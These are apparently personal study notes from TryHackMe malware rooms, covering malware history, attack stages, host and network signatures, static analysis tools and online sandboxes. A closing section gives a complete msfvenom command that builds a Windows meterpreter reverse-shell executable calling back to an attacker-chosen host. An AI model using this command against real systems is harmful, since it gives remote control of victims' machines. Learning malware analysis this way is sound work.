1. ###### History ([room](https://tryhackme.com/room/historyofmalware))
- malware = malicious software
- 1971 - first malware - Creeper
- 1973 - first "antivirus" - Reaper (was created to remove any copy of Creeper)
- 1974 - Wabbit - reproducing as fast as rabbits => computer would choke on their own resources; did not spread through network
- 1975 - ANIMAL - first Trojan
- 1982 - Elf Cloner - first microcomputer virus, boot sector virus, spread to US Navy
- 1986 - Computer Fraud and Abuse act

2. ###### Intro ([room](https://tryhackme.com/room/malmalintroductory))
- when analysing it's important to consider: 
	- Point of Entry
	- indicators of malware being executed on a machine
	- what does the malware do
- attacks - targeted vs. mass campain
- malware attack process breakdown:
	1. Delivery
		- USB, PDF attachment,...
	2. Execution
		- what does it do - encypting files, logs keystrokes, displays ads,...
	3. Maintaining persistence (not always the case)
	4. Propagation (not always)
- two categories of fingerprints:
	- host-based signatures - results of execution and any ppersistence performed by malware
	- network-based signatures - network communication taking place during delivery, delivery and propagation
- two types of malware analysis:
	- static 
		- gaining high level abstraction of the sample
		- PE Explorer, PeID, IDA, WinDg
	- dynamic - usualy involves executing the sample

3. ###### Analysis
- 
	1. Static analysis
	- MD5 checksum
		- on Windows: [HashTab](http://implbits.com/products/hashtab/)
		- in Linux: md5checksum or md5deep
		- lookup the MD5 checksum - Virustotal,...
	- identify the compiler/packer of a file
		- PeID (W), [Detect it Easy](https://github.com/horsicq/Detect-It-Easy) (L)
		- packing is a form of obfuscation
		- in IDA - check Imports - obfuscated code has little to no Imports
	- strings ([room](https://tryhackme.com/room/malstrings))
		- text/numbers contents of a program
		- can contains credentials, Bitcoin addreses
		- SysInternalsSuite => Strings (W), strings (L)
	- imports
		- PE Explorer (W GUI), IDA
	- automated analysis with [[binwalk]]
	- more condensed summary with [[exiftool]]

1. ###### Research ([room](https://tryhackme.com/room/malresearching))
- checksums + VirusTotal
- online sandboxes - [any.run](https://any.run/), [hybrid-analysis](https://hybrid-analysis.com/)



###### Create Malicious Executable
- `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<host_IP> LPORT=<destination_port> -f exe -o maliciousfile.exe`
	- `-a`: architecture
	- `--platform`: windons/linux
	- `-p`: payload
	- `-f`: file extension
	- `-o`: output file
